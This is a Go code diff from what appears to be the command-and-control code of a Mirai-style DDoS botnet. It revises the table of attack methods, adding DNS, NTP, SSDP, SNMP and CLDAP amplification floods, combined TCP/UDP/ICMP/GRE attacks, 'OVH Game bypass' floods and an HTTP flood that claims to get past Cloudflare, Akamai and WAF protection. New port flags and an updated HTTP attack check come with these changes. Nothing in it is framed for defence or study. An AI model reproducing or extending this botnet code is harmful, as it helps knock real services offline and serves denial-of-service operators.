@@ -49,6 +49,10 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 	"referer":   FlagInfo{18, "Referer header for HTTP requests"},
 	"size":      FlagInfo{0, "Size of packet data (alias for len)"},
 	"port":      FlagInfo{7, "Destination port (alias for dport)"},
+	/* AXIS-L4 specific flags */
+	"tcpport":   FlagInfo{19, "TCP port for AXIS-L4"},
+	"udpport":   FlagInfo{20, "UDP port for AXIS-L4"},
+	"greport":   FlagInfo{21, "GRE port for AXIS-L4"},
 }
 
 /*
@@ -60,21 +64,27 @@ var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
 	"tcp":      AttackInfo{0, []uint8{0, 1, 6, 7, 25}, "TCP flood optimized for Gbps"},
 	"udp":      AttackInfo{1, []uint8{0, 1, 6, 7, 25}, "UDP flood optimized for Gbps"},
 	"http":     AttackInfo{2, []uint8{7, 8, 20, 22, 24, 30}, "HTTP flood optimized for RPS"},
-	"axis-l7":  AttackInfo{3, []uint8{7, 8, 16, 17, 18, 24, 30, 31}, "Browser emulation + HTTPS + CF bypass"},
-	"ultimate-l7": AttackInfo{10, []uint8{7, 8, 16, 17, 18, 24, 30, 31}, "ULTIMATE L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
-	"ultimate-l4": AttackInfo{11, []uint8{0, 1, 6, 7, 25}, "ULTIMATE L4 - Combined TCP+UDP+ICMP+GRE with spoofing"},
-
+	
 	/* OVH Bypass */
-	"ovhtcp":   AttackInfo{4, []uint8{0, 1, 6, 7, 25}, "TCP with OVH Game bypass"},
-	"ovhudp":   AttackInfo{5, []uint8{0, 1, 6, 7, 25}, "UDP with OVH Game bypass"},
+	"ovhtcp":   AttackInfo{3, []uint8{0, 1, 6, 7, 25}, "TCP with OVH Game bypass"},
+	"ovhudp":   AttackInfo{4, []uint8{0, 1, 6, 7, 25}, "UDP with OVH Game bypass"},
 
-	/* ICMP & Combined */
-	"icmp":     AttackInfo{6, []uint8{0, 25}, "ICMP ping flood (no port needed)"},
-	"axis-l4":  AttackInfo{7, []uint8{0, 1, 6, 7, 25}, "Combined OVHTCP + OVHUDP + ICMP"},
+	/* ICMP & GRE */
+	"icmp":     AttackInfo{5, []uint8{0, 25}, "ICMP ping flood (no port needed)"},
+	"greip":    AttackInfo{6, []uint8{0, 1, 6, 7, 25}, "GRE IP flood"},
+	"greeth":   AttackInfo{7, []uint8{0, 1, 6, 7, 25}, "GRE Ethernet flood"},
 
-	/* GRE Attacks */
-	"greip":    AttackInfo{8, []uint8{0, 1, 6, 7, 25}, "GRE IP flood"},
-	"greeth":   AttackInfo{9, []uint8{0, 1, 6, 7, 25}, "GRE Ethernet flood"},
+	/* AXIS Methods */
+	"axis-l7":  AttackInfo{8, []uint8{7, 8, 16, 17, 18, 24, 30, 31}, "AXIS-L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
+	"axis-tcp": AttackInfo{9, []uint8{0, 1, 6, 7, 19, 21, 25}, "AXIS-TCP - TCP+OVH-TCP+ICMP+GRE combined attack"},
+	"axis-udp": AttackInfo{10, []uint8{0, 1, 6, 7, 20, 21, 25}, "AXIS-UDP - UDP+AMP+VSE+ICMP+GRE combined attack"},
+
+	/* Amplification Attacks */
+	"dns-amp":  AttackInfo{11, []uint8{6, 25}, "DNS Amplification (50x-100x)"},
+	"ntp-amp":  AttackInfo{12, []uint8{6, 25}, "NTP Amplification (100x-500x)"},
+	"ssdp-amp": AttackInfo{13, []uint8{6, 25}, "SSDP Amplification (30x-50x)"},
+	"snmp-amp": AttackInfo{14, []uint8{6, 25}, "SNMP Amplification (50x-100x)"},
+	"cldap-amp": AttackInfo{15, []uint8{6, 25}, "CLDAP Amplification (50x-70x)"},
 }
 
 func uint8InSlice(a uint8, list []uint8) bool {
@@ -105,7 +115,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
 	}
 
 	// Check if this is an HTTP/HTTPS attack
-	isHTTPAttack := atk.Type == 2 || atk.Type == 3 || atk.Type == 10
+	isHTTPAttack := atk.Type == 2 || atk.Type == 8  // HTTP or AXIS-L7
 
 	if isHTTPAttack {
 		targetURL := args[1]
